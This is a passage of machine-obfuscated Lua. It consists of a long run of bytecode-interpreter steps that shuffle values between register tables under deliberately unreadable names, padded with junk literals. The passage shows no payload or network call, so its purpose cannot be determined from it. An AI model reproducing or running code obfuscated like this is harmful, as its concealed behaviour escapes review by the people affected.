ll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0A")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cE8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("C7pW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{346;128;355;93};{842;852;707;751};{112;634;258;686};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("MVZt")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{232;70;789;658};}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("oPG")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TL")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Db")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ygB")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pfH5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j8")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oqJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zC")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ocz")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fB")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("qGx")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("kE")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("0DD")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("V6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Rhg")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tQRB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6n")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("OfY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{260;869;34;96};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oIYW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zD")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5Xv")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mp")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("tMh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Tz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{997;711;374;365};{744;86;464;914};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ky")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kvo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("K0d1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("szm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("MaaF")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{910;612;865;840};{815;134;839;281};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("baH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("GISP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{180;186;26;611};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9bt")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Wn69")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Fi")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("CHB")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QT")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{150;5;526;667};{586;659;900;942};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jWX")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("N9rA")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7X")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("uRE")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CU")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("TDZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8m")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1gT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("va")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("vSA")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FL")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pgK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3jDT")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("s8s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sse")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{482;121;155;112};"1 + 1 = 111";"1 + 1 = 111";{97;60;438;736};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ic")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("KVI")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("n4")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("L8z")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9G")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GJH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("AcPN")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6t")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mbs")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tQlP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YbU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QZj1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H0n")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("18NM")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{589;993;480;386};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{374;879;801;948};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("LINP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("1r")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("zgP")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Z9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ylS")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DHrB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Uq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{955;66;329;456};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{925;822;623;341};{94;480;923;994};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("U6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sgz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UJsN")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6Z")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Kde")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("7XML")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("so")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Q7J")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("eaLD")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Jmf")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("SGbu")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IEt")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1zao")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pk")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{553;362;174;499};{237;983;600;707};{333;591;690;787};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("WyVK")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FS")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("3gi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{421;368;229;174};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VhVv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("nxJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oy")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("BGE")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BPQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sQ9v")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hz1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("X5bj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0y")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("g8I")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("C5Zo")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0y")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{558;775;105;436};{536;29;368;461};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("13xS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ju")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l9X")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("uJdS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("2m")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("4d7")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dj")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("j8c")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Jp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OPs")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Kccj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rJ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{{988;519;304;110};"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("re")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vE1")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ae")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("p74")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajef